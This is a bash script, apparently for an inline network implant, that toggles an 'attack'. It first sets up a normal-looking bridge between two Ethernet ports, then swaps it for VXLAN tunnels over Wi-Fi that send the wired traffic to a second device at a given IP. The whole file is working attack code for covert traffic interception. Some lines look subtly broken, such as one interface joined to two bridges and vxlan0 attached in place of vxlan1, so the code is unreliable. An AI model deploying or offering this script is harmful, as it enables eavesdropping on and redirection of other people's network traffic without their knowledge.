#!/bin/bash

test=$(ip link)
# check for first execution
if [[ "$test" != *"vxlan0"* ]] && [[ "$test" != *"legBridge"* ]];
then
  echo 'First execution, attack off'
  echo 'Setting up the legitimate bridge...'
  ip link add name legBridge type bridge
  ip link set legBridge up
  ip link set eth0 master legBridge
  ip link set eth1 master legBridge
  echo 'Done, it is all normal.'

else
  # attack is active, stop it
  if [[ "$test" == *"vxlan0"* ]]; then
    echo 'Removing vxlans...'
    ip link del vxlan0
    ip link del ethToVxlan0
    ip link del vxlan1
    ip link del ethToVxlan1

    echo 'Setting up the legitimate bridge...'
    ip link add name legBridge type bridge
    ip link set legBridge up
    ip link set eth0 master legBridge
    ip link set eth1 master legBridge
    echo 'Done, it is all normal.'
  else
    # check if attack not active, and then activate it
    if [[ "$test" == *"legBridge"* ]];
    then
      if [ "$#" -ne 1 ]; then
        echo "Usage: start_attack.sh OTHER_DEV_IP" >&2
        echo "Remember to use the IPs of the wireless interface (wlan0)" >&2
        exit 1
      fi

      echo 'Removing legitimate bridge...'
      ip link del legBridge

      echo "Activating vxlan0 and setting up bridge to it..."

      MY_IP=`ip addr show wlan0 | awk  '/inet /{print $2}' | awk -F/ '{print $1}'`
      OTHER_DEV_IP=$1

      # set up the new interface for the tunnel
      ip link add vxlan0 type vxlan id 100 local "$MY_IP" remote "$OTHER_DEV_IP" dev wlan0 dstport 4788
      ip link set vxlan0 up

      # setup bridge between eth and the vxlan
      ip link add name ethToVxlan0 type bridge
      ip link set ethToVxlan0 up
      ip link set eth0 master ethToVxlan0
      ip link set vxlan0 master ethToVxlan0

      echo "Activating vxlan1 and setting up bridge to it..."

      # set up the new interface for the tunnel
      ip link add vxlan1 type vxlan id 100 local "$MY_IP" remote "$OTHER_DEV_IP" dev wlan0 dstport 4789
      ip link set vxlan1 up

      # setup bridge between eth and the vxlan
      ip link add name ethToVxlan1 type bridge
      ip link set ethToVxlan1 up
      ip link set eth0 master ethToVxlan1
      ip link set vxlan0 master ethToVxlan1
      echo "Done, attack is setted up correctly."
    fi
  fi
fi